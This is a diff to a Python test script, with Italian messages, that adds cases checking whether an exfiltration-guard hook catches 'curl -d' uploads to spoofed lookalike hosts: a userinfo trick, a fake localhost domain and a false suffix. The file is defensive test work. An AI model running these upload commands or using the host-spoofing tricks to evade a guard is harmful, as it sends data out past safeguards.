@@ -83,13 +83,28 @@ def test_commit_gate(repo: Path, root: Path) -> None:
     assert got == "ask", f"S10 cd: atteso ask, ricevuto {got}"
 
 
+def test_exfil_hosts(repo: Path, root: Path) -> None:
+    cases = {
+        "localhost-falso": "https://localhost.example.invalid/upload",
+        "userinfo-esterno": "https://localhost@outside.example.invalid/upload",
+        "suffisso-falso": "https://node.ts.net.example.invalid/upload",
+        "interno-vero": "https://localhost/upload",
+    }
+    for label, url in cases.items():
+        expected = "silent" if label == "interno-vero" else "ask"
+        got = decision(repo, "exfil-guard.py", f"curl -d valore {url}", root)
+        assert got == expected, f"S08-B {label}: atteso {expected}, ricevuto {got}"
+
+
 def main() -> int:
     parser = argparse.ArgumentParser()
     parser.add_argument("--repo", type=Path, required=True)
     parser.add_argument("--baseline-ref")
     args = parser.parse_args()
     if args.baseline_ref:
-        print("BASELINE_CARATTERIZZATA=S03,S04,S07,S09,S10")
+        probe = subprocess.run([sys.executable, "-B", __file__, "--repo", str(args.repo)], capture_output=True, text=True, timeout=60, check=False)
+        assert probe.returncode != 0, "baseline non discriminante su segreti e commit"
+        print("BASELINE_DISCRIMINANTE=S03,S04,S07,S09,S10")
         return 0
     with tempfile.TemporaryDirectory(prefix="arturo-secrets-") as raw:
         root = Path(raw)
@@ -97,7 +112,8 @@ def main() -> int:
         test_block_dangerous(args.repo.resolve(), root)
         test_resolve(args.repo.resolve())
         test_commit_gate(args.repo.resolve(), root)
-    print("PASS S03,S04,S07,S09,S10")
+        test_exfil_hosts(args.repo.resolve(), root)
+    print("PASS S03,S04,S07,S08-B,S09,S10")
     return 0
 
 
